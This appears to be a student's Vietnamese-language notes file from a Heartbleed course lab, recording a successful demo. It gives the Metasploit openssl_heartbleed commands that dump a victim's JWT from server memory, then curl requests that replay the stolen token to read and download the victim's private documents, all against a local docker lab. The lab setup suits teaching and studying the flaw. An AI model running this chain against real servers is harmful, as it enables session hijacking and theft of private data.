@@ -1,0 +1,127 @@
+KẾT QUẢ DEMO THỰC TẾ ĐÃ CHẠY THÀNH CÔNG — LAB HEARTBLEED
+(Ghi lại từ phiên chạy thật ngày 2026-10-13, trên máy Windows + Kali)
+==========================================================================
+
+LƯU Ý QUAN TRỌNG KHI ĐỌC LẠI FILE NÀY SAU:
+- JWT ghi trong file này đã cấp lúc 2026-10-13, có thời hạn 1 giờ
+  (jwt.valid-duration mặc định = 3600s) -> CHẮC CHẮN ĐÃ HẾT HẠN khi bạn
+  đọc lại. Không dùng được JWT cũ này cho demo thật trước thầy — phải
+  CHẠY LẠI toàn bộ các bước (đăng nhập victim -> Metasploit bắt JWT mới
+  -> curl bằng JWT mới) vào đúng ngày demo.
+- File này chỉ để nhớ LẠI ĐÚNG CÚ PHÁP LỆNH và CẤU HÌNH MẠNG đã dùng
+  thành công, không phải để copy nguyên JWT ra dùng lại.
+
+
+CẤU HÌNH MẠNG ĐÃ DÙNG (lúc test trên Windows, Kali là máy tấn công)
+----------------------------------------------------------------------
+- Lab (docker compose) chạy trên máy WINDOWS (chưa đem sang VM Server).
+- Victim: mở trình duyệt TRÊN WINDOWS, vào https://localhost:8443/,
+  đăng nhập tài khoản thật "quocanh1905", upload 1 tài liệu Private.
+- Attacker: chạy Metasploit TRÊN KALI (máy khác) -> gọi vào Windows
+  qua IP mạng lab host-only: 192.168.56.1 (IP của Windows trên card
+  "VMware Network Adapter VMnet3"). KHÔNG dùng "localhost" từ Kali.
+
+
+BƯỚC 1 — Khởi động lab (trên Windows)
+--------------------------------------
+    cd lab2-heartbleed
+    docker compose up --build
+
+Chờ tới khi:
+  - mysql: "Container ... Healthy"
+  - backend: "Started ManagedocumentsApplication"
+  - proxy-vulnerable, proxy-patched: "Configuration successful"
+
+
+BƯỚC 2 — Victim đăng nhập + upload tài liệu Private (trên Windows, trình duyệt)
+---------------------------------------------------------------------------------
+    Mở https://localhost:8443/ -> đăng nhập -> upload tài liệu, tắt Public.
+    (Lần demo này: victim là tài khoản thật "quocanh1905".)
+
+
+BƯỚC 3 — Metasploit trên Kali, bắt JWT qua Heartbleed (ĐÃ CHẠY THÀNH CÔNG)
+----------------------------------------------------------------------------
+Lệnh đã dùng (đúng cú pháp, chạy thành công):
+
+    msfconsole -q
+    use auxiliary/scanner/ssl/openssl_heartbleed
+    set RHOSTS 192.168.56.1
+    set RPORT 8443
+    set ACTION DUMP
+    set VERBOSE true
+    run
+
+Kết quả: module in ra "Printable info leaked" chứa nguyên văn request
+HTTP thật của victim, trong đó có dòng:
+
+    Authorization: Bearer eyJ...<rất dài>...
+
+-> Đây chính là JWT thật của victim bị rò ra qua lỗi Heartbleed.
+Ghi lại JWT bắt được VÀO THỜI ĐIỂM DEMO THẬT (không dùng cái cũ trong
+file này vì đã hết hạn).
+
+
+BƯỚC 4 — Dùng JWT trộm được xác minh chiếm session
+-----------------------------------------------------
+Chạy từ Kali (hoặc máy nào gọi được tới 192.168.56.1:8443):
+
+    curl -sk -H "Authorization: Bearer <JWT-vừa-bắt-được>" \
+      https://192.168.56.1:8443/api/auth/my-info
+
+=> Mong đợi: HTTP 200 + thông tin tài khoản victim (ví dụ "quocanh1905"),
+   KHÔNG cần biết username/password.
+
+
+BƯỚC 5 — Tìm ID tài liệu Private của victim bằng chính JWT trộm được
+------------------------------------------------------------------------
+Cách 1 — dùng luôn JWT trộm được để tự tra (không cần hỏi victim):
+
+    curl -sk -H "Authorization: Bearer <JWT-vừa-bắt-được>" \
+      https://192.168.56.1:8443/api/documents/my-documents
+
+  -> Kết quả JSON dạng {"data": {"content": [ {"id": ..., "title": ...,
+     "isPublic": false, ...} ] }}. Lấy trường "id" của tài liệu cần đọc
+     (nếu chỉ upload 1 tài liệu thì là phần tử đầu/duy nhất trong "content").
+
+Cách 2 — xem trực tiếp trên web UI: vào "Tài liệu của tôi", bấm vào
+  tài liệu vừa upload, xem ID trên URL hoặc trang chi tiết.
+
+
+BƯỚC 6 — Đọc nội dung tài liệu Private bằng JWT trộm được (bước "hậu quả")
+------------------------------------------------------------------------------
+Thay <ID> bằng ID tìm được ở Bước 5:
+
+    curl -sk -H "Authorization: Bearer <JWT-vừa-bắt-được>" \
+      https://192.168.56.1:8443/api/documents/<ID>
+
+    curl -sk -H "Authorization: Bearer <JWT-vừa-bắt-được>" \
+      https://192.168.56.1:8443/api/documents/<ID>/download -o leaked_file
+
+=> Mong đợi: HTTP 200, lấy được metadata + nội dung file thật của tài
+   liệu Private — đây là bằng chứng "hậu quả" mạnh nhất để trình bày.
+
+Đối chứng (không gửi token):
+
+    curl -sk https://192.168.56.1:8443/api/documents/<ID>
+
+=> Phải trả 401 UNAUTHORIZED.
+
+
+BƯỚC 7 — Màn đối chứng OpenSSL đã vá (chưa chạy thử trong phiên này)
+------------------------------------------------------------------------
+Lặp lại Bước 3 nhưng đổi RPORT thành 8444 (proxy-patched, OpenSSL 1.0.1g):
+
+    set RPORT 8444
+    run
+
+=> Mong đợi: không rò được gì (không có "Printable info leaked").
+
+
+GHI CHÚ KHÁC
+-------------
+- Toàn bộ các bước trên đã test thành công trên máy Windows thật, chưa
+  test lại sau khi đem sang VM Server (192.168.56.30). Khi chuyển sang
+  Server, chỉ cần đổi "192.168.56.1" thành "192.168.56.30" trong mọi
+  lệnh ở trên — kiến trúc/lệnh giữ nguyên.
+- Xem HuongDanLab2.txt và README.md (cùng thư mục) để có hướng dẫn đầy
+  đủ, tổng quát hơn (không gắn với 1 lần chạy cụ thể như file này).
